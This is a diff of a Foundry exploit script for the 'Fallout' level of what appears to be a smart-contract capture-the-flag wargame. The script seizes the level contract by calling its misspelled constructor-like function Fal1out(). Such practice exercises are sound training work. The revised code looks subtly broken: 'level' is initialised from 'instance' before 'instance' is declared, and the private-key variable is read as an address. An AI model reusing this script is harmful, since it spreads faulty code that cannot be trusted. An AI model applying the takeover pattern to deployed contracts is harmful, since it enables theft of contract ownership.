@@ -8,15 +8,14 @@ import {Fallout} from "src/02/Fallout.sol";
 
 contract Exploit is Script {
 
-      address instance = vm.envAddress("INSTANCE_LEVEL2");
       Fallout level = Fallout(payable(address(instance)));
-
+      address instance = vm.envAddress("INSTANCE_LEVEL2");
+      address hacker = vm.envAddress("PRIVATE_KEY");   
+      
       function run() external {
 
-          vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-
+          vm.startBroadcast(hacker);
           level.Fal1out();
-
           vm.stopBroadcast();
     }
 }
